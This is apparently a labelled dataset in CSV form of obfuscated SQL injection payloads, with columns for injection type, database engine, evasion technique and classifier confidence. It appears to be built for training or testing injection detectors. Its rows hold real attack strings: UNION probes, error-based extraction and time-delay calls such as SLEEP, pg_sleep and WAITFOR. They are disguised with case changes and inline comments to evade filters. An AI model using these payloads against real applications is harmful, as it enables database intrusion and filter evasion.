payload,sqli_type,db_engine,evasion_tech,confidence,classification_method,source,context
"3X0O2 AnD (sElEcT=(sELECt (selecT (SeLeCt`0o3x15b5))))`lIke ( +sEleCt@couNt; ( * ) FRom!aLl_uSERs t0b1,aLL_USeRs T9,aLl_UseRS T0x8,All_USErs t4,All_users/t0X5* ) \aNd/**71iS#L?e""-p */""d"" NoT LIkE ""DA"" ; aNd\ truE or FAlse anD ""L"" Not LIkE ""lL"" OR\(SEleCT (SELECT 0)) OR (sELECt 0) or FALSE --@gynJX0b11014Y^",unknown,unknown,case_variation|inline_comment|function_alternative,0.0,rule,sqliv5_json,string_double_quote
"1%"" ) && ? ( -SeleCt (SELeCT (sElEcT (SELECT (SELECT 9067)))) fRoM ( sElect CoUnT (] * ) ,CoNcaT ( 0x0X6d6E7Aa71, ( SEleCt ( eLT ( (SELECt (SELECT 0x236b)) Like (SElecT (SElECT 0o0X236b)),(sELEct (SeLeCT (SeLECT 1))) ) ) ) ,9X717A767A71,FlOOR ( R anD (/*hL0s|k*/ (SELECT 2) ) *0b10 ) ) x From infORMATiON_SChEMA.cHARACTER_SetS grouP by x ) A )= and ( ""%"" Like """,unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"1} ) -< ), As JRZR""wheRe 0x144A LIKe (SeLeCt (SELecT 1x892)) and char ( 0X6b ) || chAr or (sELECt (SelecT (SElECt/';D*/[w1?r?*/0O0X5)))? OR ;""V"" LIkE ""v!"" OR faLse aNd - 0x0B0x1 or fAlsE||false)OR{'BrA' not LIKe 'Bra') OR fALse AnD ""&"" nOt LIkE ""&a"" oR 0x7D8=6x8d9 Or (SEleCT 0x0X16A8)/*R$h)Qb} [u6=*/NOt lIke 0X1Aa8 Or (sELEcT (SeLeCt (SeLECt 0x0))))anD trUE AND TRuE AND`""m""=""m"" OR FalSE or FalSe OR false aNd true OR FAlSe or fAlSe oR fALSE AND (SeLecT (sElecT (SeLEct (seLeCT (sELEcT (SElecT (SELeCt 1))))))) Or fAlse oR FaLSe and True or faLse#""( 0b0b0o0b18010131 +) < Or cHAr ( 3x0X0B71D [) oR ChAr ( 0X0b1080210 )| lIke Regexp_suBsTrING !( rEPeAT (+ LefT[ ( crYpt_Key *( _cHAr [( |(sElEct 4X5F) ) Or cHAr ~( 0X49 ) & or chaR> ( (seLECT (SELECT (SELeCt 0b1710611))) <) ,NULL ) *,(SeLeCt?(sELEcT 0o3O0X0b0))& ) >,0X9X1Dcd6572* ) `,NuLL ) +--c^ed+k8FO",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.0,rule,sqliv5_json,string_double_quote
"1"" ) && (selecT/*@9*/0XE83) In (, /*`@UK_/B*/ ( CHar ( 0X76 ) +chAr ( (seLeCt 113) ;) +chaR (; (sELeCT (SelECT (seleCT (SelECT 112))))&_) +CHAR` ( 0b1101062 ) +CHAr ( }(SELeCT (sElect 0X0O107)) )* + ;(* SeLEct/*Gao`]mq!:/jJ*/ ( caSE WhEN ( (sELeCT 3615) likE 3705_ ) tHen cHaR ( 0X0b0O61 ) ElSe CHAR ( 4X8X1E ) End :) < ) +cHAR ( (seLecT 113) ) +chAR &( (seLeCT (SELECT!(SeLeCT (seleCT 122)))) ); +chAr: ( 0O0x0o0x0x0b1801150 ) +chaR ( (seLeCt 0XCa) ) +Char ( (SElECT^(SEleCT 0x71)) ) ) ) aND ( ""Piya"" LiKE ""PIYa",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.0,rule,sqliv5_json,in_clause
"0b1 ) ) As""Gxvp/*FVR30mp)+:9 -I1*/wherE 5xf39=0b111101111101",unknown,unknown,comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
9 ) ) oR sleep ( (SELECT (SELECT (SELECT 0x5))) ) /**/ ANd ? ( ( (SELECT 8285) LIKE 5b0b0b10010001100001001110100000100000110110011101,unknown,mysql,case_variation|comment_whitespace|inline_comment,0.05,rule,sqliv5_json,unknown
"3x8B0O0O0O0o4x0b0b0b0x1B0o0b1000O4X4O3</*Wr (seLeCT~(SEleCT(4x55))Uaqq*/;)]? ;) {!+uNIon~aLl sELecT)NUlL,nULl,null,null,null,nuLL--",union_based,unknown,case_variation|comment_whitespace|inline_comment,0.8,rule,sqliv5_json,unknown
"IIF OR FAlSE#(<;(sEleCT (SeLECt 0X210e))?= 1862,0x4,0x9/0O0 )/*mH:*0X0X1y}KqB&GJ;""*/ 1l Du^FH",unknown,unknown,case_variation|inline_comment,0.0,rule,sqliv5_json,unknown
"4X0x8'_ ]) ;_+) <, AS=hFra WhEre""0b1000xa0A\= 0X2Be^` `+ANd ; *(SELect~6x0X0O0x0O0B10311BC) liKe, $(/*``+L^%gFGM""*/<sELECT coUNT` (_ *{!)/*(SELecT.9x6)|`NPN*/ frOM&AlL_usErS t8,aLl_uSErs^t2,alL_uSerS!t5X3x0o11x4o0O0B0B0x0x0X0O3b109o3,aLL_USers T0B3O0x0B11111,ALl_UseRS,T5_ );}--",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
"0x6o0b1000"";>>)$(~ )^( aS rfGU.where (sElecT (sEleCt (sELeCt (sEleCt (seleCT<0x12ca)))))=(SElect (seLEcT`0o0x0O0b0B0O0b11101111000111111010011011110110101110101010))/**/UnIon/*/>`v\*/all SelECT}null,NUll,NulL,nULl,NULl,nuLL,NuLL,NULL,null--",union_based,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.8,rule,sqliv5_json,unknown
"0B5' prOCEdURE AnAlysE ( ExTractValue ( (selECT+(seLEcT (SeLECt+(sEleCt (seLeCt (SEleCT (SElect (sELECT (SELEct (SELECT 5840)))))))))),ConcAT ( 2X4C,0X8183706A71, .(<!seleCt ( ?CasE whEn /( .(sELecT-0o13320) }=$ (selECT 7O0x16d0) /**/) tHEn 0b0o1 ELSe`(seleCt (SELEct (SElecT (SeLecT,0O0)))) EnD `)\ ) ,3o0X719A8b1011111111A73 / )./**/, )- ,0x4 )=and 'swke' LIkE !'swKe",error_based,mysql,case_variation|comment_whitespace|inline_comment|hex_string,0.45,rule,sqliv5_json,unknown
"1' Or| [(> SELEcT 'CqJw' FroM DUaL WHErE (SEleCT 0x0O0b1ca7) =/**/ 0O8x538 AnD (seLEct 6x0b1011111141110) liKE or (SeleCt (seLEcT (SeLect (selEcT (SELECT (SELECT (SELECT 0))))))) aNd tRUe#( sELect CoUnt (_ * ) FroM dOMAIN.DoMAiNs AS T0o1,DomAIN.CoLUMnS as T0X8,doMain.TABLes AS T0X0o3B0o22 ) ) ]or 'YcG",unknown,oracle,case_variation|comment_whitespace|inline_comment,0.06,rule,sqliv5_json,unknown
"0o0x1"" ) ) /*+`*/) ; anD (seLEcT 6x1B36) likE ) ( sEleCT (sELecT""(SElEcT (SElect (sElecT (SELECT (SELECT 0916)))))) fROM pG_SLeep ( 0o0x2 ) ?[ ) AND ( , ( ( ""IpQW"" LIke ""Ipqw",unknown,postgresql,case_variation|comment_whitespace|inline_comment|function_alternative,0.06,rule,sqliv5_json,unknown
seLECT ( Case When ( (SELECt (SeLECt 0X95A)) lIKe 0X0x9fA ) thEN^3X95a&eLSE 0B100101011091*; ( SELect 0x95a fROm)iNFORMATion_schEma.chAractER_Sets/**/ ) ^ End ) ||0x0b0X0 or fAlSe And (SelECt (SELECT 1)) and tRUE#tmk\jz,unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
"0O0b1"",Where 0x0XcC0O1B111/*0x39*TEd`X6*/ =~\1B100011001501'WaitF;;or } DELAY?'0:0X4:0X3'--",unknown,unknown,inline_comment,0.0,rule,sqliv5_json,string_single_quote
"+end AnD//*ar/(SELect 0o13x0o0o0B101)etd*/;( ""NuiX""^lIke`""nUIx",unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
"1' AnD/**y}$J*/( ($[(SElECt 0XbCC) )= 0o0B0B1081110001010101100000101110001100000 )""}*(seLect((selecT^0O0x1A2f)))&& 'tMnG'/**/LikE 'Tmng",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.0,rule,sqliv5_json,unknown
"3 ) ` ) = R= ( selecT *:FrOm` ( ?SELeCT (+ slEEp (; 2x4o5 ) ) ) vWYq ) Or ""~""$LIkE/**/""~U"" oR fALse ANd<trUE Or 0b0b0 AnD (select 6x1) anD ""K""( NoT Like ""K4""ANDTrue aNd trUE oR (SelEcT (SelECT>(SELECT 0x0))) and (SELECT 0x2421)<>(SELECT (SELECT (SELECT 0x25e1))) || "" "" NOT LIKE "" "" AND (SELECT (SELECT;0x1))#TeET ~k<",unknown,mysql,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.05,rule,sqliv5_json,string_double_quote
"5', )] ) ) ~ oR/*:\YM JDw<bSgyT_ (SElEcT (SeLEct:(seLecT@(SelecT 0o157))))S0o2Ztz+hT7eo+(SELEct (SELecT (selecT (SELECT (SELECT 7)))))@`g8 */0o0O0x0X0o20C0== ( 'aBCdeFG',UPPer ( hEx ( R anD OmbLoB ( 0x8b0o0B0x23dE9F82981D93578043A501/(SeLECT (sELeCt 0o2)) ) ; ) )' ) /**/ANd /**/ ( ( |( ]'jUeq' ;LiKe 'jueQ",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.0,rule,sqliv5_json,unknown
"0o0b111B0O5O0'|And:SlEEp/\(~ 9O6o0o0x6X6^/*oBvLEHG)C[ASa*/) ""[And?OR False#'USgv'|lIKE 'USGVp}3G17m<4",unknown,unknown,comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv5_json,unknown
"1%"" ): ): aNd?0b0b1010010110101111101010000100111110& =/*1((SELEct 0x3)*/ 2506",unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
"1"" )} , ) aS,KTUe WhERE{0b0B8201011111009 ;LikE (SELect&0o0o0X0X0B0o9o82fc) aND (SElecT 5x0X0O312) _LikE (: sElEcT?counT /( ^* )/*0x2*Vk*/ FROM%doMAin.doMaIns As T0X1,DOMaiN.COlUMnS As}t0b10,domain.TABLeS>AS?T0b61*;) ,or FaLsEAND(selECT (sEleCt 0xf6)) NOT Like 1X0o342+\ oR $ (SElECT (sELect (SElect 0B2x30B0O5)))=0X20B0o6 ANd truE and TRuE OR falSE || 5683<>(seLEct (sELect (SELECT (SELECT 5684)))) Or ""PhL""=""phLw"" OR 0 --",unknown,unknown,case_variation|inline_comment,0.0,rule,sqliv5_json,string_double_quote
"WAItFor/*+(SELECT (SELECT (SELECT (SELECT 9))))|P;y] /ZK`dx*/delay,'0B0b0O0o0:(SELEcT (sEleCT (sElECT 0x5))):0b0b0B0o1131' And#?/**/ ( { (`/ /(: '%'='",unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
"0O3""? ) ) ) [ +oR (SELECt+0B5x3fE)/*&`[l];hP_tUEB+C;4QaX=(SELECT (SELECT (SELECT 9))).cj*/ liKe ( sELECt cOunT~^( ~* ) FRom AlL_USeRs t0O0O0o1,All_UseRs T0O0o0x0b0b1106110,alL_usErs""t0,aLL_uSers-T0,aLl_uSErS T0! ) OR ;)FAlse --",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
"1& )_] )$@.<aS HuXq!WhErE+1o0b0b10110101111001100010111000010001011011111101101 = (seLeCt_0X0o0X1945)<UNION.AlL/*aFD*/selECT_Null,NULL,NuLl--",unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
sELecT ( casE when <( 4057'= 1o2X7884 )< then:0x0X0b0x9c0 Else casT ( 0X1 AS?INt ) / ( <seLect.(seLECt/*dc)s~*g?p&lM+`Z*/(SElECt (sELeCT (SelecT 0X0))))'fRoM duaL )^ ENd ) }@From dUAL--,unknown,oracle,case_variation|inline_comment,0.06,rule,sqliv5_json,unknown
"0b8, ) where$0O0o4x9B4e@: lIKe 0X1b3e AND 0o9O8O0X8D0x0x1x0B0B1013,;LiKe +( SELEct?COuNT ( {* ) From&SysuSERS[As SYS1,SySUsers^aS}sYS2,SYSusErs^as!sys3,SysUsERS As SyS0B103,SYsUsERS AS/sYS4x0o0x0o0o1X4,sYsUsers As Sys9,sySUsERS/*(seLECt[(sELeCT`(sElECT:(seleCT?(SelECT (sELeCT (SElecT (sElEct (sELECt (SeleCT 0b110))))))))))?v+ 0o10DkgD+rhd(]9LF0?0o2gbI (SELECT 2)??*/AS sYS0o5X0< ) --",unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
"7O0o0x0b111X1 `)/* f*/ As kAEw""wheRe'3Xa62^.lIKE 2658",unknown,unknown,comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
"7' iN BoolEan mODe ) or Row $( <0x415,(seLeCt (SeLECT 1562)) ) > ( selEct coUNt ( * ) ,CONCaT ( 0x7271706A0b0b0o0x57, ( seLECt ( elt ( (seLeCt (sEleCt (sELect 0045))) Like : (SelEct (SeLECT 0O2025)),0X1 ) : )- ) ,0X0B0O1315A766a71,flo Or ` (% rAND ( 0 ) *(Select (seLECT (SELEcT (Select 2)))) )=( ) x FROm ( SEleCT (sElect 8488) UnIOn seleCt 5584 UNion sELeCt (sELeCT 0xbeB) UNiOn sElect 0X4C0 ) ,A GROUP BY x [) And TRuE oR faLse/*8%{""6?)['*/ or FalsE Or:falSE oR FALsE Or 0O1160 nOt lIkE 654 anD 'g' LiKe 'G' OR FALSe And 1 or fAlSe or 0 OR False#vOM&d",union_based,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.7,rule,sqliv5_json,string_single_quote
"1':WHerE 2x0F3>LiKe (SeLeCT+0x9F3) && ;0X0O0X1b7o0x0B0O0O33 ^= (, sELeCt 0B0X1B6B From PG_SlEeP ( [0o0b101,@>) `) /*)BxE""Jx d%<Ne (SelECt 4X5)%[eyiU3*/ or)(seLeCT (seLect 0b4O0x0X9A9)) LIke 6b0x91b5B55c51a:oR FaLSe~ANd ""?""+nOt>LIkE ""?T"" OR '4X' Not LIke '4X' And&truE}and.(sElEcT 0O0x0b0o3) *or fALse } && (sELeCT 0X1) Or ""K?"" nOT like ""K?""(and TRuE Or FaLSE oR false or~fALsE aND TrUe/**/aND ""PM"" NOt like/**/""PmF"" or/*z*/(SelECT (sELEct (SELECT 0))) OR fAlSe AnD (SeleCT (SElect 1)) --",unknown,postgresql,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.06,rule,sqliv5_json,string_double_quote
"sELEct sleep~*(@ 2B0b0B0b1101100B0o0o6B805o6b2x1o8 ?) [:and*>:,(/*e)R5C/**/*W[cl7 e[&4H:*/. )( &}'%'@:}likE@[+'",unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
selECT (/*&0B0b0O167o$IKoQQ;?u.ib(*/ cASE wHEN (_}0b10010101000011=0o12149/!); Then 0B010111010601 ELSe 0O6721<*/ ( OR False AND True AND True#Select (Select!(sELeCT 0xea3)) froM`mySql.DB{{)\& enD ) Or falSE Or FalSE#S!E,unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
"0x0o0o0X3b0b1080'/**/, ) / ) } OR)SLeEP'\(\'(select/* Lqrn^+2iIK0x4B0b1101110N2p*/0b0x0o1), )@ .Or :FALsE/*@rv>,*/ and ? TRue:Or faLSe~Or\FaLSE OR FAlsE:||$fALSe OR^(Select (selECT 9050)) LIKe>9051 OR (sELECT (SELECT (SELECT 0))) `/**/&& TrUE or(faLSe oR fALSe AND True#=Yz g\(SELECT'3)\",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,numeric
"2]aNd+7xDfC/**/ =/*o|A tTD*/ &(/ sELECt coUnt/*j|ip{*/:( * ^) frOm DomaIN.DOMains]AS t0B101,dOMAiN.COlumNS As t0o7,doMain.tABleS?AS T0o0o1=() Or 5b0; Or ""`0B181"" nOT liKe ""`7"" anD TRuE>OR FaLsE OR ''d*n' Not lIKe 'd*N' or:""sm"" NoT lIKE ""sM"" oR FAlsE and True OR FaLsE oR fAlSE Or fAlSe && (selecT (SELEct 0x4DC)) NoT = 0X145f AnD ""]""=""]"" ANd TRUe Or FaLsE OR False --",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv5_json,unknown
"1' aNd.}/uPdaTEXmL<&( <7B9b9x0B10011a0o432ef64,cOnCat}/*pn<H*/( 3x7X0X9E,0x7871700a72, ;( sELect (+{ELT&<(}_0o4x0xD41/*rsUIi9d?(SELecT/*;5O;*/0b111o5)^(sEleCt (sEleCT<0X9))`X4 5HWX*/[=: (SeleCT (seleCT:0Xd6o0x33)),2b0x1 `) ),)@ =)<$,0B0X0x717A0X2ffA78 ) ,0o0x0B411101001+ )/*I)tCiwO?hS*/ AND'kirD' =""'KIrD",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
"0b0B1) ) ` Or 0B0x6eX13a6 *lIKe% \( ?sElect""CouNT ^(= * )) From^alL_uSErs:T9O0b10x7,alL_uSeRs_T0b107,ALl_uSeRs T0o3,aLl_useRS T9,ALl_USErs~t0o5 ;)[ \aND^; ( (selECT (selECt""(sElECt 9X0O0x87C)))/*L;g4a,N/ ~<r+M|Jf7SmBd3gpf9g<?*/ LIke` 4525",unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
SELEcT /**/ ( `cASE wHen (/**/ 0B111X0o0b0b1110100100010000010000010110000010101010 = 0B0b1111110101111070091000101101110110 ) :tHEn 0x2466 ElsE (sElect 9318)* (/**/ SeLECT 0x2466 FroM iNFORmAtioN_schemA.charaCTEr_sETs ;) eND' ) && tRuE anD 3735/*')jgOc]G9*/ liKE (selECT (seLect 1781)) oR 1107 LikE 1108 OR 0#N B3eY,unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,numeric
0o0X0X0o0B1001O0x0b0x8O0o6x0x0X2B4x9x8b8x6B0x3b0b14o8XB'?rlikE_ (-+SeLECt * FrOM ;() seLEct*}(?`SLEep ( 0B0o0X5 `); /*1re;m3~)ba*/])]` ) {sgvO )^ + And)+ 'MABd'='mAbD,unknown,mysql,case_variation|comment_whitespace|inline_comment|hex_string,0.05,rule,sqliv5_json,unknown
"0' ) ) `As+XpMy AjeGTSGMko+fw4ycP]Iwgt/k IC*/WHEre>8X142A=0x749A rLIkE ( }SElecT ( ~Case wHen: ( 0b0x1001D2CC576 LIke 4x2o1E17&{)? ;tHen (sElECT 0x1) elsE 0x24 enD_ [) "" ) OR <(seLeCT 0X0) ANd ""R""=""R"" && ""&CW""/*\/!Y +uNZa*/NOt%lIKE ""&cW`""* && TRUE or faLsE| OR fAlse aND}trUe.oR faLsE && TruE+or ""ry""=""Ryq"" anD TrUe and true AnD tRuE Or fAlSE or (SelEcT (SelecT (SelECt (select 0x0)))) And)True OR fAlSE or ""F"" lIKe ""fq"" && truE --",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
0B1 /) ANd 2B0X12e1=cASt ( ( Chr ( 113 ) /*>u((sELECt (SeLEcT 3))-gx4*/ Or cHr ( (seLeCt (SelEcT 113))< ) OR CHR ( 0b0o160 ) or chr ( (SelEcT (sELEct 106)) ) Or chr '( (SELECT 113) ) ) Or ( SeLeCT. (+ CASE whEn ?( (selECT 0B1081051110101) liKe (seleCt (SELECT 2853))^ ) tHeN 0O0X0x1 eLse (seLecT~(sELect (sELEct 0))) END ) ) \ ::tEXt ^||/ ? (| chr ( (sElect (SeLEct (SeLeCT^133))) ) || cHR ( (SElECt (SELECT 0x7a)) ) ||cHR {( .(SElECT (SELECT (SeleCt 118))) ) Or chr ( 2X0x0B0b1101111A *) ||CHR ( (SeLECt 313) ) ) \` AS>numErIc ),error_based,postgresql,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.46,rule,sqliv5_json,unknown
"1""+ ):/*JIh1*/ WheRe""0X2O22A7 LIKE {0b10100001110111",unknown,unknown,comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
1'+>{([ sELecT)taGA\wherE 0X1f9x0b100210 /*-L$gb!O?!b*/likE[/**/0o17710,unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
"1%"" aNd eXtracTvalue &( (SelecT (selecT (SELEcT 0B0B0B1111011011110))),COncat ( 6X2C,3x5b11101101001010110111000A0B0xF42Af, (} SeLEct ( :ELT ( 0x0x0B0x1f2e=(seLect 0X1F2e),0x1&|,) /*cY|Snkd2[YhmhJ*/) )-/,7X710a0b0b111100010801000101010011009111a76. ) .) ' And: ""%""=""",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
"1' ) ) ) /**/ && & ( SelECT 4X236b FROm ( SELECt COUNT (( * ^) ,CONcAt ( 0x7171706A0B1000117, ( SeLEct ( eLt? ( 0O0B0O21553+ lIKE 3b0x91894d8cBD3,(SeleCT 0O0x3) ) ) /*e*/) ,0x0o1311A8x0B10fDa71,fLOOr ( 'r&& ]( \(SeLEct (sElEcT (SELeCt (select (SeLECt (seLeCt (sElect (SeleCT (selecT (sElECt (selecT 0x4))))))))))) ;)/**/ *(SElect 0X2) ) )@ x FROM iNfoRmAtion_SCHEMA.cHArACTER_Sets groUp;bY x ) A ) anD: :(! ""( ( &'JiCQ' liKe 'jIcQ",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.0,rule,sqliv5_json,unknown
"( sELEct CHar ( (sElECt (SeLEct 0x0o107)) ) &+ChAR ( (SelEcT}(seLect (sElEcT (SElecT (SELECT (SELECT 113))))))/*{(Xp*\J{:}^ A*/ ) +Char ( (sELECt 4x264)) ) +chAR (< 0X6a ), +chAr ( (seleCT (SELEcT 0x0X47)): )/ + ( SeleCt _ ( CasE When (> 0B10x0o20F5 [lIke 4X0o0O106f2 ) THen ChaR ( 0x0X0x5f< ) else chAR ( (SELect 0X30) ) EnD ) ) +ChAR ( ?0O0o241 ) +ChAR ( 0b1111110 ) +chaR ~( (SELECt (seLECt 0x94)) ) +CHAr ( ;0x7a () +cHAr ( (SelEcT]0O0X5AF) ) )",unknown,unknown,case_variation|inline_comment,0.0,rule,sqliv5_json,unknown
"5 wHErE/*(SELecT#0X15)+;\(DkO Bwjw ~]$/`G RxQnJG.z[\&/kt+kK\; */0x0O4E6 Like 0b0O7364^ANd Char+ ( (SELEcT (SeLecT 0o0x0X6x87)) ) OR=ChaR (; 0X8d/**/ ) OR cHaR ( (sElEct (SElECt (SELeCT (sElEcT (sElECt (sElecT (seLect (sELECT 0X60)))))))) ) ^||chAR ( (selECT 0b0X50)\ ) = REGEXP_SUbSTriNg ( @REPeaT ( lEfT ( crYpt_Key () CHAR ( (sELECT 0X42) ) or cHaR ( (SeLeCt 0x45) ) ||ChaR ( 0X0B0X53 ) ,nuLL ) ,0b0X0 ) ,(SElECt 0o0x3fAf0290) ) ,nUll ) ]anD true `OR( (SElecT 0X0) OR fALsE and tRue anD TRuE AND truE Or (SELEct 0x0) and (sELeCt 0X1) Or '.h%'!='.h%' Or ""Y""!=""y"" and 0Xa0x6F NOt liKe (SELeCT 0XA48) OR FALSe aND trUE Or FALSE oR (SElECT (sELECT 0X0))_or fAlse OR FaLSE aNd (selecT (SELECT 1)) --",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"1 WHErE """"I"" LIKE """"i"" ANd Char $( _0B1101100 `) &Or cHaR (>~(SelECt 0O116) ) ||cHaR [( 0o0X2X2E ) ^ or chaR ( 5x5a ) =reGexP_SUbstrINg ( REPEaT ( righT ( cHaR^ ( (seLEcT (sElecT (seLECt (sELECT 4x15Ec)))) ;) ,(sElect 0X0) ) ,(SElECT 0x12A05f200) ) ,null ') oR (SELect (SeLect 0)) aND ""X"",nOT LIkE ""XG""/**/oR FALsE or 0x0 AnD trUE AnD true aNd (Select 0X1) ANd 0X1 OR FAlsE And True OR (seLEcT (SeLECT (selEct (SELECT 0)))) --",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.0,rule,sqliv5_json,unknown
"2%"" AND chAr ( (SELect/*[Ya*/(seLEct (SELECT (SELECT 103)))) ) ||cHar ( 0X8d )@ OR CHar ( 0x61 <)/ ||chaR ( 0b0B11110110100101010000 ) := rEgexp_SubsTRIng ( rePEat +( leFT ( cRYPT_kEY: ( cHAr ( (seLECt (SeLECt 0X41)) ) oR ChAR_'( (selECt (SeLecT (select 69))) ) OR OR FAlse# char ( (seLeCt (SelEcT 0X0o65)) ) ,Null )+!,(sElect (sELeCt (SELEct 0X5))) )_ ,0X1dcD6483 ) ,nuLL ) ""AnD (seLecT (sELECt 0x1)) OR false ANd (SELEcT (SELECT 1)) --w",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv5_json,string_double_quote
"7'/\&OR faLse or+fAlSE#or > ! ( ""SeleCt*'cFFf'#wHERe/*V*ARkssXnAJeTIhpf*/9b0x0b0xbB3\~= 0o10746+",unknown,unknown,case_variation|inline_comment,0.0,rule,sqliv5_json,string_single_quote
"1'+ ( SEleCt 'JTVq' WHERe 3B5X0B0X178a08A4d4 liKE/ (SElEct 0X2086) AND +( SELEct *?fRom =( SEleCt ( sleEP ( 0X0B0O0o5 ) +<()\ /*zlS;mz(?+cMtp,IgY*/ ) gCrr@{) '~ or faLSE Or (seLEct (SELeCt (seleCt (sELecT (SELECT 0))))) or FAlsE AnD '<mx@'¬ = '<mx@M' OR falSe OR "",P"" nOT like "",P""#u""T Zo$+Ua`=A+",unknown,mysql,case_variation|comment_whitespace|inline_comment|function_alternative,0.05,rule,sqliv5_json,string_single_quote
"1'+ (/*aAg/k*/ seLect 'UIjV' WhERE/**/0x1c6f =/**/0B1110001101111 AND 0B0x0B0B11100101110100010111111110101100010111100100001110100011000010010111001101001001010101111000101011111100010110101100111011011110011111010111000 LIke dbmS_pipE.rEceIVe_mEssaGe ( chR ( /*a*/0B1000101 )/**/ ||CHr ( 1X4F ) ||Chr\ ( 0x65/**/*) [||cHR ( (sElEct (sEleCT 0x44)) &) ,(seLEct (seLECt (seLECT (SELECT 0b101)))) ) || faLSe OR 'M '='m o' --",time_blind,oracle,case_variation|comment_whitespace|inline_comment|hex_string,0.41,rule,sqliv5_json,string_single_quote
"SeLEct cOUNT$ (% * *)/*~(seleCt)0x3)Vm7l?=*//;FROm RDb$fIEldS.as%t7,RDB$TyPeS.As=T4,RDb$Collations aS]T6O5X5,Rdb$FuncTIOns/*(sELEcT.0X6),hJ@JJA[(SeLEct;0O0X9)\nzq DR*/as&t4 aND{`^(+ 0o0X3X9x9C8B8x2'=[0B11010001011",unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
